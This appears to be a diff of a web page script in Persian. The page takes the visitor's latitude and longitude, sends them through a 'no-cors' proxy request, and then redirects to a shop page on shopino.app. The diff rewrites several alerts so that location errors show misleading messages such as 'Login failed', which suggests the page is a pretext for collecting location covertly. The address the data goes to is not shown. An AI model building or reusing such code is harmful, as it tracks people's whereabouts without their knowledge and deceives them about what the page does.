@@ -114,16 +114,14 @@
           mode: "no-cors"
         }).then(function() {
           alert("موفق!");
-          setTimeout(function() {
-            window.location.replace("https://vinaaccessory.com/");
-          }, 2000);
+          window.location.href = "https://shopino.app/shops/1469?page=15";
         }).catch(function(err) {
           console.warn("Proxy request failed:", err);
-          alert("خطا! دوباره امتحان کنید");
+          alert("خطا! دوباره امتحان کنید.");
         });
 
       } else {
-        alert("لطفا دوباره امتحان کنید.");
+        alert("لطفاً دوباره امتحان کنید.");
         console.warn("Latitude or Longitude is missing.");
       }
     }
@@ -131,11 +129,11 @@
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          alert("ناموفق! خطا رخ داد.");
+          alert("با خطا مواجه شد.");
           console.error("User denied the request for Geolocation.");
           break;
         case error.POSITION_UNAVAILABLE:
-          alert("با خطا مواجه شد.");
+          alert("ورود انجام نشد.");
           console.error("Location information is unavailable.");
           break;
         case error.TIMEOUT:
